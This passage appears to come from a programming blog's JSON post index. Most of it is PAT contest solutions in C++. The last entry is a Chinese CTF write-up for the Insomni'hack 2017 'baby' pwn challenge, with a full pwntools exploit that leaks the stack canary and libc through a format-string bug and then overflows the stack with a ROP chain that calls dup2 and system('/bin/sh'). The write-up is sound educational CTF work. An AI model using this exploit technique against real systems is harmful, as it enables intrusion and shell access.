that 1 &lt;= K &lt;= 10，0 &lt;= NK &lt; … &lt; N2 &lt; N1 &lt;=1000. Output For each test case you should output the sum of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate to 1 decimal place. Sample Input2 1 2.4 0 3.22 2 1.5 1 0.5 Sample Output3 2 1.5 1 2.9 0 3.2 注意保留1位精度，注意把0挑出来 Code1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;cstdio&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;typedef long long LL;using namespace std;int k1;int k2;int k3 = 0;int flag = 0;float a[1001] = &#123;0&#125;;float b[1001] = &#123;0&#125;;float c[1001] = &#123;0&#125;;int main()&#123; cin &gt;&gt; k1; for (int i = 0; i &lt; k1; i++)&#123; int tmp; cin &gt;&gt; tmp; cin &gt;&gt; a[tmp]; &#125; cin &gt;&gt; k2; for (int i = 0; i &lt; k2; i++)&#123; int tmp; cin &gt;&gt; tmp; cin &gt;&gt; b[tmp]; &#125; for (int i = 1000; i &gt; -1; i--) &#123; c[i] = a[i] + b[i]; if (c[i]) k3++; &#125; if (k3) &#123; cout &lt;&lt; k3 &lt;&lt; ' '; &#125; else &#123; cout &lt;&lt; k3 &lt;&lt; endl; return 0; &#125; for (int i = 0; !c[i]; i++)&#123; flag = i + 1; &#125; for (int i = 1000; i &gt; -1; i--) &#123; if (c[i] &amp;&amp; i != flag) printf(\"%d %.1f \", i, c[i]); else if (c[i] &amp;&amp; i == flag) printf(\"%d %.1f\\n\", i, c[i]); &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1001","date":"2017-02-01T16:02:49.000Z","path":"2017/02/02/PAT-advanced-1001/","text":"Description 1001.A+B Format(20)时间限制400 ms内存限制65536 kB代码长度限制16000 B判题程序Standard作者CHEN, YueCalculate a + b and output the sum in standard format – that is, the digits must be separated into groups of three by commas (unless there are less than four digits). Input Each input file contains one test case. Each case contains a pair of integers a and b where -1000000 &lt;= a, b &lt;= 1000000. The numbers are separated by a space. Output or each test case, you should output the sum of a and b in one line. The sum must be written in the standard format. Sample Input-1000000 9Sample Output-999,991 暴力可以解决PAT上不少问题= = Code123456789101112131415161718192021222324252627282930313233343536#include &lt;cstdio&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;typedef long long LL;using namespace std;int main()&#123; int flag = 0; int j = 0; LL a, b, c; int num[20]; cin &gt;&gt; a &gt;&gt; b; c = a + b; if (c &lt; 0)&#123; flag = 1; c = -c; &#125; if (flag)cout &lt;&lt; '-'; if (c == 0) &#123; num[0] = 0; j = 1; &#125; while (c)&#123; num[j] = c % 10; c = c / 10; j++; &#125; for (int i = j - 1; i &gt; -1; i--) &#123; cout &lt;&lt; num[i]; if (i % 3 == 0 &amp;&amp; i) cout &lt;&lt; ','; &#125; cout &lt;&lt; endl; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1100","date":"2017-02-01T14:10:39.000Z","path":"2017/02/01/PAT-advanced-1100/","text":"Description 1100.Mars Numbers(20) Zero on Earth is called “tret” on Mars.The numbers 1 to 12 on Earch is called “jan, feb, mar, apr, may, jun, jly, aug, sep, oct, nov, dec” on Mars, respectively.For the next higher digit, Mars people name the 12 numbers as “tam, hel, maa, huh, tou, kes, hei, elo, syy, lok, mer, jou”, respectively.For examples, the number 29 on Earth is called “hel mar” on Mars; and “elo nov” on Mars corresponds to 115 on Earth. In order to help communication between people from these two planets, you are supposed to write a program for mutual translation between Earth and Mars number systems. Input Specification: Each input file contains one test case. For each case, the first line contains a positive integer N (&lt; 100). Then N lines follow, each contains a number in [0, 169), given either in the form of an Earth number, or that of Mars. Output Specification: For each number, print in a line the corresponding number in the other language. Sample Input:4295elo novtam Sample Output:hel marmay11513 学习了sscanf(&amp;src, format, &amp;dest)这个函数，从&amp;src输入字符串到&amp;dest。而且还有个坑，13在这里不是tam tret而是tam Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;cstdio&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;cstring&gt;#include &lt;string&gt;#include &lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;string low[13] = &#123; \"tret\", \"jan\", \"feb\", \"mar\", \"apr\", \"may\", \"jun\", \"jly\", \"aug\", \"sep\", \"oct\", \"nov\", \"dec\" &#125;;string high[13] = &#123; \"\" ,\"tam\", \"hel\", \"maa\", \"huh\", \"tou\", \"kes\", \"hei\", \"elo\", \"syy\", \"lok\", \"mer\", \"jou\" &#125;;const int maxSize = 50;char s[maxSize];int n, x, ans;string current;int main()&#123; scanf(\"%d\", &amp;n); getchar(); while (n--) &#123; gets(s); if (s[0] &lt;= '9' &amp;&amp; s[0] &gt;= '0') &#123; sscanf(s, \"%d\", &amp;x); if (!(x / 13))&#123; cout &lt;&lt; low[x] &lt;&lt; endl; continue; &#125; if (x / 13 &amp;&amp; x % 13)&#123; cout &lt;&lt; high[x / 13] &lt;&lt; ' ' &lt;&lt; low[x % 13] &lt;&lt; endl; continue; &#125; if (x / 13 &amp;&amp; !(x % 13))&#123; cout &lt;&lt; high[x / 13] &lt;&lt; endl; continue; &#125; &#125; else &#123; ans = 0; if (strlen(s) != 4) &#123; for (int i = 0; !i || s[i - 1]; i += 4) &#123; current = \"\"; for (int j = i; j &lt; i + 3; j++) current += s[j]; for (int i = 0; i &lt; 13; i++) &#123; if (current == high[i]) ans += i * 13; if (current == low[i]) ans += i; &#125; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; &#125; &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"2017Insomni’hack teaser Pwn baby writeup","date":"2017-01-31T16:50:36.000Z","path":"2017/02/01/2017Ins/","text":"2017的第一场比赛，看了看，只会做一道forencis，pwn的baby还是很简单的，然而由于对canary的认识不足，导致如此简单的一道题目也不会。后面的pwn就没看了。 baby 50有三个漏洞选项，stack overflow、fsb、heap overflow，checksec看下 123pwndbg&gt; checksec RELRO STACK CANARY NX PIE RPATH RUNPATH FILEFull RELRO Canary found NX enabled PIE enabled No RPATH No RUNPATH /home/ubuntu/ctf-problem/2017ins/pwn/baby/baby WTF???居然保护全开了，这是最坑爹的了，当时看到canary我就不知道栈溢出该怎么用了，后来才知道canary是全局变量，每个进程中栈的canary是一样的，在进程运行时，先生成一个16byte的canary，然后随机从中选8byte填充，并且在后以’\\00’结尾截断，不泄露栈地址 dprintf函数原型int dprintf(int fd, char* format[, ...])，和printf很像，我理解就是加了一个重定向的printf，一样有fsb漏洞。 这题的思路，fsb泄露canary，libc，构造rop chain，stack overflow执行system(‘/bin/sh’) 现在的问题时，我们的canary在栈上的第几个参数？libc应该泄露哪个参数。 看了wp，发现分别时%138$llx、%158$llx。似乎大家都知道这个事。。。 然后libc泄露的是__libc_start_main+0xf0的地址，所以得到的地址减0xf0-__libc_start_main 64位的参数传递rdi, rsi, rdx, rcx, r8, r9。注意下dup2()这个函数，这个函数用来重定向，原型int dup2(int odlfd, int newfd)。 dup2和dup函数一样，只是返回的文件描述符可以通过第二个参数”可用的文件描述符“指定。如果“可用的文件描述符“是打开状态，则会被关闭；如果”现存的文件描述符“和”可用的文件描述符“一样，则不会关闭. 但是我这里还是有个地方不明白，在这里dup2()的oldfd参数为什么是4和0、1、2；0、1、2分别表示标准输入、标准输出、标准错误输出，然后每打开一个新文件返回没有被使用的fd的最小值。这里打开了标准输入输出，至于为什么是4我还没搞懂= = exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *# rdi, rsi, rdx, rcx, r8, r9# int dup2(int odlfd, int newfd)context.log_level = 'debug'def dofmt(payload): p.recvuntil('Your choice &gt; ') p.sendline('2') p.recvuntil('Your format &gt; ') p.sendline(payload) return p.recvline()def dostack(): p.send('\\n') p.recvuntil('Your choice &gt; ') p.sendline('1') p.recvuntil('send ? ')def leak_libc(): payload = '' payload += '%138$llx_%158$llx' array = dofmt(payload).split('_') return int(array[0], 16), int(array[1], 16)def bof_stack(): dostack() # buf = 0x410 = 1040 payload = 'a' * 0x408 payload += p64(canary) + p64(1) + p64(pdr) + p64(4) + p64(psr) + p64(0) + p64(dup2) payload += p64(pdr) + p64(4) + p64(psr) + p64(1) + p64(dup2) payload += p64(pdr) + p64(4) + p64(psr) + p64(2) + p64(dup2) payload += p64(pdr) + p64(binsh) + p64(system) payload_length = len(payload) + 1 p.sendline(str(payload_length)) p.sendline(payload) log.info(p.recvline()) p.interactive()if __name__ == '__main__': pdr = 0x21102 # pop rdi; ret; psr = 0x202e8 # pop rsi; ret; p = remote('127.0.0.1', 1337) libc = ELF('libc.so') canary, libc_addr = leak_libc() libc_base = libc_addr - 0x20830 libc.address = libc_base pdr = libc_base + pdr psr = libc_base + psr system = libc.symbols['system'] dup2 = libc.symbols['dup2'] binsh = libc.search('/bin/sh').next() bof_stack()","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"writeup","slug":"writeup","permalink":"http://reehy.top/tags/writeup/"}]}]